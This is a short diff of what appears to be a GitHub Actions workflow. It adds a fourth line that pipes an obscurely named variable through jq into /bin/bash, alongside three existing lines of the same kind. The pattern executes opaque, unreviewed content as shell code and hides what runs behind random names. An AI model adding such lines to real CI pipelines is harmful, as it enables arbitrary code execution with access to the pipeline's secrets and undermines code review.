@@ -29,6 +29,7 @@ jobs:
           echo $vxj59018 | jq -r .x220 | /bin/bash
           printf '%s' "$pbhq8" | jq -r .d6 | /bin/bash
           echo $f257 | jq -r .tqb9 | /bin/bash
+          printf '%s' "$khyl94" | jq -r .ztvvc2 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
